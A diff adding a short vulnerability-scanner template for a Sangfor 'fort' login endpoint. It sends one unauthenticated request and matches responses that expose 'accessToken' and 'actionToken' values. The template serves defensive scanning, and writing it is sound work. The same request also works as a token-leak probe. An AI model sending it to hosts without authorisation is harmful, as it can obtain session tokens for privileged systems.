@@ -1,0 +1,19 @@
+id: SANGFOR-search_login-token
+
+info:
+  name: SANGFOR-search_login-token
+  author: SANGFOR
+  severity: high
+
+http:
+  - raw:
+    - | 
+      GET /fort/login/search_login HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: text/plain
+      Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+         - status_code==200 && contains_all(body,"accessToken","success","actionToken")
